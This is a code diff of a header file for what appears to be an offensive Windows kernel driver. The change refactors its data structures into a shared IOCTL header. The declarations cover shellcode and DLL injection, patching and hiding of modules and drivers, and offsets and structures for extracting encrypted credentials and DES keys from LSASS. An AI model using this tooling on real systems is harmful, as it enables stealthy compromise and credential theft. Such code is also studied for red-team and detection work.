@@ -1,6 +1,7 @@
 #pragma once
 
 #include "pch.h"
+#include "IoctlShared.h"
 #include "MemoryHelper.h"
 
 extern "C" {
@@ -61,49 +62,6 @@ constexpr SIZE_T LsaInitializeProtectedMemoryDistance = 0x310;
 constexpr SIZE_T LogonSessionListDistance = 0x310;
 constexpr SIZE_T IvDesKeyLocationDistance = 0x82A6F;
 
-enum class InjectionType {
-	APCInjection,
-	NtCreateThreadExInjection
-};
-
-struct DllInformation {
-	InjectionType Type;
-	ULONG Pid;
-	CHAR DllPath[MAX_PATH];
-};
-
-struct ShellcodeInformation {
-	InjectionType Type;
-	ULONG Pid;
-	SIZE_T ShellcodeSize;
-	PVOID Shellcode;
-	PVOID Parameter1;
-	SIZE_T Parameter1Size;
-	PVOID Parameter2;
-	SIZE_T Parameter2Size;
-	PVOID Parameter3;
-	SIZE_T Parameter3Size;
-};
-
-struct PatchedModule {
-	ULONG Pid;
-	PVOID Patch;
-	SIZE_T PatchLength;
-	CHAR* FunctionName;
-	WCHAR* ModuleName;
-};
-
-struct HiddenModuleInformation {
-	bool Hide;
-	ULONG Pid;
-	WCHAR* ModuleName;
-};
-
-struct HiddenDriverInformation {
-	WCHAR* DriverName;
-	bool Hide;
-};
-
 struct PebLinks {
 	LIST_ENTRY InLoadOrderLinks;
 	LIST_ENTRY InInitializationOrderLinks;
@@ -130,24 +88,6 @@ struct HiddenItemsList {
 	SIZE_T Count;
 	FastMutex Lock;
 	PLIST_ENTRY Items;
-};
-
-struct KeyInformation {
-	ULONG Size;
-	PVOID Data;
-};
-
-struct Credentials {
-	UNICODE_STRING Username;
-	UNICODE_STRING Domain;
-	UNICODE_STRING EncryptedHash;
-};
-
-struct IoctlCredentials {
-	SIZE_T Count;
-	Credentials* Creds;
-	KeyInformation DesKey;
-	KeyInformation Iv;
 };
 
 struct LsassInformation {
@@ -231,31 +171,31 @@ public:
 	~MemoryHandler();
 
 	_IRQL_requires_max_(APC_LEVEL)
-	NTSTATUS PatchModule(_In_ PatchedModule* moduleInformation);
+	NTSTATUS PatchModule(_In_ IoctlPatchedModule* moduleInformation);
 
 	_IRQL_requires_max_(APC_LEVEL)
-	NTSTATUS InjectShellcodeAPC(_In_ ShellcodeInformation* shellcodeInformation, _In_ bool isInjectedDll = false);
+	NTSTATUS InjectShellcodeAPC(_In_ IoctlShellcodeInfo* shellcodeInformation, _In_ bool isInjectedDll = false);
 
 	_IRQL_requires_max_(APC_LEVEL)
-	NTSTATUS InjectShellcodeThread(_In_ ShellcodeInformation* shellcodeInfo);
+	NTSTATUS InjectShellcodeThread(_In_ IoctlShellcodeInfo* shellcodeInfo);
 
 	_IRQL_requires_max_(APC_LEVEL)
-	NTSTATUS InjectDllThread(_In_ DllInformation* dllInfo);
+	NTSTATUS InjectDllThread(_In_ IoctlDllInfo* dllInfo);
 
 	_IRQL_requires_max_(APC_LEVEL)
-	NTSTATUS InjectDllAPC(_In_ DllInformation* dllInfo);
+	NTSTATUS InjectDllAPC(_In_ IoctlDllInfo* dllInfo);
 
 	_IRQL_requires_max_(APC_LEVEL)
-	NTSTATUS HideModule(_In_ HiddenModuleInformation* moduleInformation);
+	NTSTATUS HideModule(_In_ IoctlHiddenModuleInfo* moduleInformation);
 
 	_IRQL_requires_max_(APC_LEVEL)
-	NTSTATUS RestoreModule(_In_ HiddenModuleInformation* moduleInformation);
+	NTSTATUS RestoreModule(_In_ IoctlHiddenModuleInfo* moduleInformation);
 
 	_IRQL_requires_max_(APC_LEVEL)
 	void RestoreModules(_In_ ULONG pid);
 
 	_IRQL_requires_max_(APC_LEVEL)
-	HiddenModuleEntry* FindHiddenModule(_In_ HiddenModuleInformation* info) const;
+	HiddenModuleEntry* FindHiddenModule(_In_ IoctlHiddenModuleInfo* info) const;
 
 	_IRQL_requires_max_(APC_LEVEL)
 	NTSTATUS HideDriver(_In_ wchar_t* driverPath);
